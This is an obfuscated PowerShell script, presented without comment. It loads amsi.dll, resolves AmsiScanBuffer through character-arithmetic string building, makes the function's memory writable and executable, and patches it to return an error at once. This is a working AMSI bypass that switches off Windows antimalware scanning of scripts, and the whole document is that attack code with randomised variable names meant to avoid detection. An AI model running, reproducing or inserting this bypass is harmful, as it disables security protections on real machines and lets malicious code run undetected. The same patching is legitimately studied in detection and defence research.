$Iutz = @"
using System;
using System.Runtime.InteropServices;
public class Iutz {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr rCL, string rpl4FSPBqLmLQF831lS);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr AIMN5mpMGMzl, UIntPtr eO5zhZ, uint NyrQqHuAWUG0Zh, out uint h9a9b_mfQ7b4Upz);
}
"@

Add-Type $Iutz

$HRYuFUCnsnw = [Iutz]::LoadLibrary("$(('âms'+'í.d'+'ll').NORMAlIZE([chAR](70*24/24)+[CHAR]([bYte]0x6f)+[char](112+2)+[chaR](109+22-22)+[cHaR](68+33-33)) -replace [CHAR](85+7)+[CHaR]([BYTe]0x70)+[CHAr](123*70/70)+[cHaR](77+21-21)+[ChaR]([bytE]0x6e)+[CHAr](125+123-123))")
$jDQC1qwOyb0JX = [Iutz]::GetProcAddress($HRYuFUCnsnw, "$([cHAr](65)+[ChAr](109+47-47)+[ChaR](115+64-64)+[cHAR]([bYte]0x69)+[chAr]([bytE]0x53)+[cHar]([bYTE]0x63)+[chAr]([byTe]0x61)+[ChAr]([bYTE]0x6e)+[chaR](66*23/23)+[ChAR]([ByTe]0x75)+[CHar]([BYte]0x66)+[CHAr](60+42)+[cHaR]([byTE]0x65)+[cHaR]([bYTE]0x72))")
$p = 0
[Iutz]::VirtualProtect($jDQC1qwOyb0JX, [uint32]5, 0x40, [ref]$p)
$lQc2ao9C2zZbv3 = "0xB8"
$goKW3nbnyvl = "0x57"
$pSLIB = "0x00"
$g1wFtdn00A_U = "0x07"
$H8823SBkZaN = "0x80"
$RVqVoudVCuViI = "0xC3"
$gFE4uFpEnPr8gT8j = [Byte[]] ($lQc2ao9C2zZbv3,$goKW3nbnyvl,$pSLIB,$g1wFtdn00A_U,+$H8823SBkZaN,+$RVqVoudVCuViI)
[System.Runtime.InteropServices.Marshal]::Copy($gFE4uFpEnPr8gT8j, 0, $jDQC1qwOyb0JX, 6)